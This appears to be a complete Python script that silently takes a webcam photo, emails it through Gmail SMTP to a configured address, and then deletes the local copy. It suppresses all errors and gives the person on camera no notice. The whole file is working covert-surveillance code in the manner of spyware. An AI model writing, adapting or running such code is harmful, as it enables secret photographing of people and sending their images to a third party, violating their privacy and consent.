from email.mime.text import MIMEText
from email.utils import formataddr
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import ssl
import sys
import cv2
import os



def GetPic():
    try:
        camera = cv2.VideoCapture(0)
        return_value, image = camera.read()
        cv2.imwrite('pic.png', image)

    except Exception as e:
        sys.exit()


def sendPic():
    try:
        sender_email = "YOUR GMAIL HERE"
        sender_name = ""
        password = "YOUR PASSWORD HERE"
        filename = "pic.png"
        msg = MIMEMultipart()
        msg['To'] = formataddr(("", "YOUR GMAIL HERE"))
        msg['From'] = formataddr(("", "YOUR GMAIL HERE"))
        msg['Subject'] = ''

        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename= {filename}", )
        msg.attach(part)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        context = ssl.create_default_context()
        server.starttls(context=context)
        server.login(sender_email, password)
        server.sendmail("YOUR GMAIL HERE", "YOUR GMAIL HERE", msg.as_string())
        server.quit()
    except Exception as e:
        sys.exit()


def DelPic():
    try:
        os.remove("pic.png")
    except Exception:
        sys.exit()



if(__name__ == '__main__'):
    GetPic()
    sendPic()
    DelPic()